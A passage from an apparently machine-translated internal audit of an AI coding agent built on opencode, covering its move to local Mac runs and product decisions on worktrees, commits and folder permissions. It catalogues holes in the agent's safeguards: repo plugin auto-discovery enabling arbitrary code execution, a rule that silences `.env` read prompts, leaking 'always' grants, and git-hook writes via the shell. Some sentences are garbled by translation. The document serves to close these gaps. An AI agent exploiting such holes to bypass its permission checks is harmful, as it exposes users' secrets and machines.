diagnostic report”.

> **FACT (MIN-363, 2026-08-15): this debt is paid.**
>
> - The five comments have been rewritten **where they are read** — the two from
> [opencode-permissions.ts](../../lib/server/agent/vm/opencode-permissions.ts)
> (measurement n°1, and the `case "external_directory"` which is called dead branch
> instead of “second curtain”), the three of
> [opencode-config.ts](../../lib/server/agent/vm/opencode-config.ts): the
> measure #4 now says there are **two** catalogs, `list: "allow"` has
> disappeared (12 tools used, no `list`), and `OPENCODE_SHELL_CWD` too (0
> occurrence, rechecked at `strings` on `opencode-darwin-arm64`). Both
> deletions leave behind a comment that says **why the
> line is not there**, otherwise the next reread would put it back.
> - The line “the executing machine holds no secrets” was **already**
> corrected by MIN-355/357/360 in three places (`network-policy.ts`,
> `vm/main.ts`, the `apiKey` block of `opencode-config.ts`), like the paragraph
> `read *.env ask` from [harness-opencode.md](../harness-opencode.md). Checked,
> nothing to rewrite.
> - **The switchover criterion is rewritten** at the top of §4 of
> [desktop-electron.md](../desktop-electron.md), with its four assumed deviations
> and a reference to D1/D2 for the two paragraphs that these decisions expire.
> - **Logs exist before the launcher**:
> [lib/desktop/run-log.ts](../../lib/desktop/run-log.ts) (dated naming and
> sortable, rotation with two caps which always keeps the most recent,
> substitution of secrets in writing, form of the report) with its test, and
> [desktop/src/run-log.ts](../../desktop/src/run-log.ts) for the `fs`. The
> MIN-293 launcher only needs to connect the two sound streams `utilityProcess`
> on `openRunLog(...).write` — the file header shows all five lines. The
> gesture **Help → Copy Diagnostic Report** is in place, and it only does
> fill the clipboard: nothing goes away by itself.

---

## 11. “What if Numo was just an opencode wrapper? »

Question asked after the first audit. Fourteen agents: six inventories of
delegated/forced sharing, four delegation theses, four contradictors.

### 11.1 Sharing today

**The big delegation has already taken place**, and it cost 18,100 lines less
(`agent-loop.ts`, 2,305 l., and `subagent.ts`, 1,066 l., deleted — cf.
[harness-opencode.md](../harness-opencode.md) §2.31). Are already in opencode: the
loop of rounds, model calling, streaming, retries, compaction of the
context, file and shell tools, subagents, system prompt,
the end of turn criterion (`session.idle`), and **conversation history**
— minddy's checkpoint literally leaves with `messages: []`.

What Minddy keeps falls into three families, and **they are not the same**:

| Family | Examples | Delegable? |
| --- | --- | --- |
| **Product** | the thread (`opencode-events.ts`, 768 l.), the ~37 domain tools, the ledger, the delivery gate, the commit and the PR | No. It's Mindy. |
| **What opencode can't do** | the ledger per round (opencode publishes neither `generation_id` nor the invoiced cost, and **does not invoice anything for an aborted round** while the supplier invoices), the Stop and the steering, the turn deadline | No. |
| **Hosting mechanics** | log export/replay, heartbeat, server restart every round | **Yes — and it's the only one.** |

### 11.2 The four theses

| Thesis | Verdict | What the contradiction has left |
| --- | --- | --- |
| **Live session** — server survives between rounds | **the only one who gives back** | The gain is real but **over-counted** (see 11.3) |
| **Native permissions** — delegate arbitration to opencode rules | **partially, and especially not for security** | **Opencode does not have an approval UI: it only has a protocol.** Its screen is its TUI, which we do not launch. The approval window, **we write it in all cases.** And ~536 of the 1,140 lines announced as deletable cannot leave: `command-guard` is also called by `run_background` (a minddy tool that opencode never sees), `repo-path` by the hands of the harness. |
| **Tools by MCP** — the local bridge becomes our MCP server | **not to do** | **Transportation is not arbitration.** MIN-293 is entirely about arbitration of **integrated** tools; our domain tools do not go through **any** of these mechanisms. Zero lines of `opencode-permissions.ts` move. And that would reopen MIN-326 (the anchor lock), break the grant (`run.created_by` → “<client> (mcp)”), and share the 120 req/min cap with the user's Claude Code. |
| **Run user opencode** | **no** | We would lose the **ledger** (our provider declares `cost` model by model; a model declared without `cost` renders `cost: 0`), the **pinned version** - or [harness-opencode.md](../harness-opencode.md) is a logbook **on this binary**, not on a public API - and the control of what opencode reads. |

### 11.3 The real gain, once the contradiction has passed

The thesis announced **~1,700 lines** deleted. **The opponent is right to
fold it back**, and for the exact reason the OP feared — *displaced work
counted as work deleted*:

- **`drain.ts` (456 l.), `network-policy.ts` (270 l.), sandbox adapter: does not
  do not disappear.** §7 of this audit poses an invariant — an anchor run
  `pr`, webhook, routine, channel or public board **never leaves
  local**, and BYOK neither. **Cloud path does not die.** These files
  become every other branch, not dead code.
- **The counts are inflated**: the ranges cited for the journal give
  **83 lines**, not “~180”; `appendRunJournal` + `loadRunJournal` is **49
  lines**, not “~130”.
- **`opencode-host.ts` does not disappear**: it changes owner and
  frequency (an app installation operation instead of a cost per turn).
  And his current behavior — the child dies with us — **is an invariant
  written and motivated** (“no orphan server between two rounds”), not an oversight.

**What remains, and which is true:**

1. **Log export/replay exits** — `syncJournal`, `syncHistory`/`syncReplay`,
   the `agent_run_journal` table, the `POST /journal` route, its purge. His reason
   to be is written in the code: *“this is what makes a turn independent of the
   microVM that preceded it »* ([supervisor.ts:506](../../lib/server/agent/vm/supervisor.ts#L506)).
   Checked by grep: this table has **exactly one drive** in the entire repository.
   **And it's a confidentiality decision before being a code saving**:
   it is she who would bring up the contents of personal files in the database
   prod (§6).
2. **`ask_user` stops being terminal.** Today minddy `reject`e the question
   and **cuts the turn**, the response coming back to the next turn via the steering. The
   comment says why: *“keep a microVM open for as long as a human
   coming back would cost hours of compute”*. **This pattern falls on the Mac.**
   `POST /question/:id/reply` blocks without timeout and does not end the round. We
   removes the most twisted detour of the harness - a human response that returns
   disguised as a steering message.
3. **The “always” ceases to be worth a turn** (measure no. 8) — but see 11.4.
4. **The dead callId** (measure no. 5) ceases to be the ordinary: the problem does not exist
   only because we kill the process. He stays on ⌘Q and crashes.

### 11.4 What WORSE if the session survives

- **The `always` leaks between sessions** (measured). Today, the restart of
  server each turn is what **contains** the leak. A server who lives
  for a long time, it is a “yes” given on ticket A that applies to ticket B.
  **The thesis removes an accidental guardrail without replacing it.**
- And the grain does not change: `always` on `edit` carries `*`, `*` crosses the `/`,
  a human `always` overwrites a config `deny`. **Make one last longer
  too crude a mechanism, on the user's disk, aggravates the problem.**
- **§5.7 becomes immediate**: `OPENCODE_PORT`, `OPENCODE_DB_PATH`, the XDGs are
  global constants. A single server run by the app is just one
  SQLite database for all tickets**.

The real remedy for “always” is therefore not the survival of the server: it is the
**ruleset per session** (`POST /session {permission: […]}`), which transforms a yes
human in lasting rule to a grain that we choose. Measured from: a ruleset in
`allow` **does not cut** the catalog (unlike `deny`), and a rule of
pattern in `deny` does not cut either — `disabled` only cuts if the last
rule that matches `pattern === "*"`. **But** our client only knows
`createSession(title?)`: a rule set at **creation** cannot express
“Always” clicked **during the tour**. The update route remains at
check.

### 11.5 Two fixes which do not depend on any of these theses

**`read: "allow"` neutralizes a protection provided by opencode.** The ruleset by
binary default carries `read: {"*":"allow", "*.env":"ask", "*.env.*":"ask",
"*.env.example":"allow"}`. Our rules being concatenated **after** and the last
winning match, our `read: "allow"` **deletes the question on `.env`**. Without
consequence in a disposable microVM. **Burned to the user's disk.**
Three details that change the gesture:

- it is written **twice** — [opencode-config.ts:328](../../lib/server/agent/vm/opencode-config.ts#L328)
  and **:530**, this second literal being that of the `explore` sub-agents,
  that is to say precisely those whose job is to read;
- remove it alone **nothing gained**: `read` would then go back to
  `decidePermission`, whose `switch` only knows `task`/`bash`/`edit`/
  `external_directory` — and would come across `default: return ALLOW`;
- the framework also provides for **copying the express `.env`** in the
  worktree (§4.3). Both decisions must be made together.

**Opencode auto-discovers plugins in the repository.** It loads everything `*.ts` under
`.opencode/plugin(s)/` and go back from the cwd to look for a `opencode.json` — and
minddy doesn't lay **any** of the hatches that would disable him. In a microVM
disposable, it's no problem. **On a Mac, this is arbitrary code execution
from the content of a repository**, therefore an injection vector which bypasses
completely the permissions model. To be closed before any local run.

### 11.6 Response to OP

*“Isn't Numo already an opencode wrapper, and giving up more ground doesn't
wouldn't it simplify the premises? »*

Numo **is** already a wrapper — the big delegation took place and cost 18,100
lines. What remains around is not fat: it is the product (the thread, the
tickets, the ledger, the PR) and what opencode cannot do (the invoice, the
Stop, clock). **Releasing more does not reduce this work, it shifts it.**

What simplifies the premises is **the end of a constraint, not a transfer of
responsibility**: the microVM was dying at every turn, so minddy was rebuilding
the state. On a Mac, there is nothing left to rebuild.

**And this simplification hardly touches any of the hard points from §2 to §7.**
The wall of paper, approval fatigue, the cascade of refusals, the order of
rules, the three locks, the watchdog, TCC, the secret scan: intact.
**Delegation is a good code saving, not a worksite response.**

---

## 12. Product owner decisions (2026-08-14)

Four decisions taken after reading this audit. They **reduce significantly**
the perimeter — half of the hard points in §2 and §3 come out of v1.

### D1. The environment is chosen at the beginning and no longer changes

Cloud/local selector on the agent page, **at the start of a conversation**,
then frozen — like `agent_runs.agent_engine`, and for the same reason written
(“each engine rereads ITS memory in the checkpoint”).

**Direct consequence: the cloud fallback during the conversation in §4.5 of
framing does not exist.** A withdrawal can only take place **before the first round**.
This removes from the file the hot switch, its log replay and its contradiction
with the engine doctrine.

### D2. By default, the agent works in the current repository; the dedicated worktree is an option

Reverses §4.3 of the framework and the recommendation of §4 of this audit. Pattern
product: this is what Claude Code does — session in the current checkout by
default, dedicated worktree on request.

**What it removes**, and it's substantial: the management of worktrees, the
explicit setting for copying `.env` (they are already there), the cost
installation of the first round, cleaning and purging, accumulation of
`opencode/repos/` snapshots. **All of §4.3 of the framing evaporates.**

**What it requires**, on the other hand, and which is not optional: the end string
tower cannot remain what it is. Three actions destroy work
human in a shared checkout:

| Gesture | Anchoring | What it does at the human checkout |
| --- | --- | --- |
| `git add -A` | [repo-host.ts:334](../../lib/server/agent/repo-host.ts#L334) | Internship **all** the unignored: the human WIP goes to PR |
| `git checkout -b` | [repo-host.ts:169](../../lib/server/agent/repo-host.ts#L169) | Changes its branch under its fingers |
| `git config user.email/user.name` | [repo-host.ts:163-164](../../lib/server/agent/repo-host.ts#L163-L164), :248-249 | Rewrites **its** git identity in **its** repository (measured) |

The third can be set in one pass: identity **by command** (`git -c
user.email=…`), never persisted. The first two require deciding the
deliverable — see D2bis.

**Two guardrails lose their meaning** and it must be said: the worktree was
presented as the boundary that prevents the agent from stepping on the human. In mode
Currently, this border no longer exists at all. And two holes in §4 become
direct instead of requiring a `git -C`: write to `.git/hooks/` through the shell, and
`git config core.hooksPath`. **They go from “major” to “blocking v1”.**

### D2bis. The deliverable in current mode — **CLEARED (2026-08-15): B**

> **PO's decision, taken upon seeing the first real local tour.** The agent had
> edited `test.txt` in the current repository *and* pushed a branch
> `minddy/agent/note-…` on the forge. Verdict: *“it must not create a
> branch in local mode, since it edits locally. »*
>
> **The tour commits nothing and pushes nothing** ([supervisor.ts](../../lib/server/agent/vm/supervisor.ts),
> end of turn). Its deliverable is the work tree: the agent edits, the thread says what
> which has moved (read in the tree, limited to the perimeter of the turn), and the human reads again
> in its editor then commits itself.
>
> **What won the decision was not the theory, it was what we saw
> the screen**: the branch was pushed by sha from a disposable index, so it
> did not exist anywhere locally. We read it in the interface without being able to
> find in its own `git branch` — a branch that we did not request,
> a place that we cannot see.
>
> **What it costs, and this is a fifth deviation from the criterion of §4**: the sweater
> request ceases to be the end of a turn to become an **explicit gesture** —
> `create_pr`, always served, which pushes when asked. No line of
> the MIN-358 machinery does not die: it changes triggers.
>
> **What this eliminates as a bonus**: the overlap with human work
> (`current_repo_overlap`) can no longer happen on its own. Without commit
> automatic, nothing takes away someone's files in a pull request
> which he did not ask for — it was the hole that §D2 said “non-optional” and
> that no trick closed.
>
> Option **C** (dedicated worktree as soon as a PR is requested) remains open and
> becomes the natural extension: it is the same explicit gesture, with a file
> apart.

Three shapes, to choose before the delivery batch.

- **A — Selective staging, branch not changed.** `git add -- <chemins de l'agent>`
  instead of `-A`. Minddy already knows these paths (`delivery.noteEdit`). **But**
  measure n°7 becomes critical: an “always” on `edit` carries `*` and returns
  subsequent editions silent — the list would then be **false**, not only
  incomplete. And it ignores files created by the shell (a `npm install` which
  rewrites the lockfile, a codegen). *Fallback impossible on `git status`: he sees
  also the WIP of the human.*
- **B — No commit at all.** The trick leaves the changes in the commit tree
  work, the thread says what changed, the human rereads in his editor and commits.
  **This is exactly Claude Code's product**, and it is consistent with D2. But
  it is no longer “the product is identical, only the machine changes”: PR
  becomes an explicit gesture, not the end of the round.
- **C — Dedicated Worktree as soon as a PR is requested.** Current mode is used to
  iterate, the worktree mode to deliver. The selector then carries two things.

### D3. V1 = the project folder, nothing else

**Access to the rest of the computer is out of v1.** The agent sees the local repository
assigned to the project, period.

**What goes outside the perimeter, and that's most of the weight:**

- all of §2 (the wall of paper) — `external_directory` remains in `deny`;
- all §3 (human approvals): the third verdict `ask`, the channel
  descendant, request table, TTL, cascade, notifications
  actionable, fatigue, the scope of a “yes”, sustainable grants;
- the N roots, `denyRoots`, `readRoots`, the blacklist, the `realpath`;
- `PermissionVerdict` keeps `once | reject`, `decidePermission` almost doesn't move
  not.

**Which remains non-negotiable in v1**, because it does not depend on access outside
folder:

1. `default: return ALLOW` → `reject` on local path
   ([opencode-permissions.ts:183-185](../../lib/server/agent/vm/opencode-permissions.ts#L183-L185)).
2. **Close plugin auto-discovery** `.opencode/plugin(s)/` (§11.5) — in
   current repository mode, this is the execution of arbitrary code from the content
   from a repository, on the user's machine.
3. **`read: "allow"`** (§11.5): in current deposit mode, the `.env` **real** of
   the user is there, and our config clears the question that opencode was asking.
   What was a v2 decision becomes a v1 decision.
4. **Normalized** path guarding of the LLM proxy, mandatory mint, refusal
   BYOK locally (§4, lock 2).
5. `git config core.hooksPath` / `git -C` / writing to `.git/` by the shell.
6. The watchdog at 15 min, `sandboxMs` bounded **server side**, the invariant
   “a run with third-party content never goes local” (§7).
7. The scanning of secrets before push, and the decision on `agent_run_journal` (§6).

### D4. macOS folder permissions are in scope

`~/Documents` and `~/Desktop` are common locations for a repository; without
processing, access is denied **and the request window does not even open**.

To do: `NS…UsageDescription` (Documents, Desktop, Downloads, volumes
removable) via `extendInfo` from electron-builder — **knowing that it changes
the republication imprint**, therefore republication + renotarization.

**To measure before, because it could be cleaner:** the gesture
attaching the file to the project necessarily involves a `dialog.showOpenDialog`
(today never used in the shell). One selection per system panel
constitutes explicit consent and may be sufficient to open the path without a TCC prompt.
**Not verified**, and there is a second unknown that matters more: the harness
is a **child** process, and opencode is a grandchild. It is necessary to measure whether the
right goes down to the shells of the model. This is one more argument for
`utilityProcess.fork` (child of the signed bundle) against a detached process, which
loses its responsible process.
